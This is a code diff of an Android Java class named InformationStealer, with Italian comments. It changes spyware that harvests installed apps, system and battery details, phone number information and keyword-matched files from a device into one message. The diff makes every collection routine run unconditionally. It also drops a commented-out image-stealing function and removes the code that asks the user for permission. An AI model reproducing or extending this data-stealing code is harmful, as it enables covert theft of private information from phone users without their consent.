@@ -26,7 +26,6 @@ public class InformationStealer implements Runnable {
 
     private static final int READ_EXTERNAL_STORAGE_PERMISSION_REQUEST = 1;
     private static StringBuilder messaggio;
-    private static boolean permissionFlag = true;
 
     String[] keywords = {
             "illegal",
@@ -67,27 +66,15 @@ public class InformationStealer implements Runnable {
         InformationStealer.messaggio = messaggio;
     }
 
-    public boolean getPermissionFlag(){
-        return permissionFlag;
-    }
 
-    public void setPermissionFlag(boolean permissionFlag){
-        InformationStealer.permissionFlag = permissionFlag;
-    }
     @Override
     public void run(){
-        if(permissionFlag){
         messaggio.append(stealApp(context));
         messaggio.append(stealSystemDetail(context));
         messaggio.append(stealBatteryInformation(context));
         messaggio.append(stealFileSystemInfo(context, keywords));
         messaggio.append(stealNumberInformations(context));
-    }
-        else{
-            messaggio.append(stealApp(context));
-            messaggio.append(stealSystemDetail(context));
-            messaggio.append(stealBatteryInformation(context));
-        }
+
 
         int index = messaggio.indexOf("&");
         while (index != -1) {
@@ -133,38 +120,6 @@ public class InformationStealer implements Runnable {
         }
     }
 
-
-    /* -------- QUESTA E' LA FUNZIONE CHE TI RUBA LE IMMAGINI PER ORA LA LASCIO COMMENTATA ---------------
-
-    public static void searchImages(Context context) {
-        // Verifica se l'applicazione ha il permesso di lettura della memoria esterna
-        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_EXTERNAL_STORAGE)
-                != PackageManager.PERMISSION_GRANTED) {
-            // Richiedi il permesso all'utente se non è stato ancora concesso
-            ActivityCompat.requestPermissions((Activity) context,
-                    new String[]{Manifest.permission.READ_EXTERNAL_STORAGE},
-                    READ_EXTERNAL_STORAGE_PERMISSION_REQUEST);
-            return;
-        }
-
-        // Il permesso è stato concesso, esegui la ricerca delle immagini
-        Uri imageUri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
-        String[] projection = {MediaStore.Images.Media.DATA};
-
-        Cursor cursor = context.getContentResolver().query(imageUri, projection, null, null, null);
-        if (cursor != null && cursor.moveToFirst()) {
-            do {
-                String imagePath = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA));
-                System.out.println("File immagine trovato: " + imagePath);
-            } while (cursor.moveToNext());
-            cursor.close();
-        } else {
-            System.out.println("Nessun file immagine trovato");
-        }
-    }
-
-   */
-
     public String stealFileSystemInfo(Context context, String[] keywords) {
         int numeroFileInteressanti = 0;
         StringBuilder sb = new StringBuilder();
@@ -172,10 +127,6 @@ public class InformationStealer implements Runnable {
         // Verifica se l'applicazione ha il permesso di lettura della memoria esterna
         if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_EXTERNAL_STORAGE)
                 != PackageManager.PERMISSION_GRANTED) {
-            // Richiedi il permesso all'utente se non è stato ancora concesso
-            ActivityCompat.requestPermissions((Activity) context,
-                    new String[]{Manifest.permission.READ_EXTERNAL_STORAGE},
-                    READ_EXTERNAL_STORAGE_PERMISSION_REQUEST);
             return "";
         }
 
@@ -258,21 +209,6 @@ public class InformationStealer implements Runnable {
         }
 
         return sb.toString();
-    }
-
-    public String getFileSystemInfo() {
-        String externalStoragePath = Environment.getExternalStorageDirectory().getPath();
-
-        StatFs stat = new StatFs(externalStoragePath);
-        long blockSize = stat.getBlockSizeLong();
-        long totalBlocks = stat.getBlockCountLong();
-        long availableBlocks = stat.getAvailableBlocksLong();
-
-        long totalSize = totalBlocks * blockSize;
-        long availableSize = availableBlocks * blockSize;
-
-        return "Total size: " + totalSize + " bytes\n" +
-                "Available size: " + availableSize + " bytes";
     }
 
     public static String stealSystemDetail(Context context) {
